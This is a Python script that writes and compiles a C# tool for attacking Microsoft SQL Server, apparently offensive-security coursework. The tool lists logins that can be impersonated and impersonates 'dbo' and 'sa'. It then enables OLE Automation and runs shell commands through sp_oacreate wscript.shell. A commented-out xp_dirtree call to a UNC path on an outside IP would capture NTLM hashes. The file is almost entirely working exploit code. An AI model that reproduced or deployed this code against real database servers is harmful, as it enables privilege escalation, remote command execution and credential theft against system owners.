#!/bin/env python3
import ak

FN_BASE = "win_sqlclient"
FN_CS = FN_BASE + ".cs"
FN_EXE = FN_BASE + ".exe"

template = r"""
using System;
using System.Data.SqlClient;


namespace SQLClient
{
    public class Program
    {
        private static string sqlServer;
        private static string database;

        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Using defaults localhost and master as database");
                sqlServer = "localhost";
                database = "master";
            } else
            {
                sqlServer = args[0];
                database = args[1];
            }

            String conString = "Server = " + sqlServer + ";Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success! Woot");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con); SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();

            String querylogin = "SELECT USER_NAME();";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();

            Console.WriteLine("Logged in as: " + reader[0]); reader.Close();
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            
            if (role == 1)
            {
                Console.WriteLine("User is a member of public role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();

            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader(); reader.Close();


            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";
            command = new SqlCommand(impersonateUser, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();


            con.Close();

            //String query = "EXEC master..xp_dirtree \"\\\\192.168.49.65\\\\test\";";
            //command = new SqlCommand(query, con);
            //reader = command.ExecuteReader();
            
            //reader.Close();
            //con.Close();
        }}}
"""

ak.write_file(FN_CS, template)
ak.cs_compile(FN_CS, "/r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll")
